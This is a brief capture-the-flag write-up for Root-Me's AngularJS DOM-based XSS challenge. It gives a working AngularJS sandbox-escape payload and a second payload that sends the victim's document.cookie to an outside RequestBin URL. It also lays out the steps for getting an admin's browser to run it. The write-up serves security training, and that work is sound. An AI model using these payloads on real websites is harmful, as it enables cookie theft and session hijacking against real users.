## Challenge name: XSS DOM Based - AngularJS

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)

**The website uses AngularJS. AngularJS evaluates expressions inside `{{ }}`.**

**Use AngularJS sandbox escape payload:**
```
{{$on.constructor("alert(1)")()}}
```

**If quotes are blocked, use double quotes with escaping:**
```
{{$on.constructor("document.location=\"https://requestbin.url?cookie=\"+document.cookie")()}}
```

**Report the URL to the admin via the Contact tab. The admin's browser executes the Angular expression and sends the cookie to your RequestBin.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
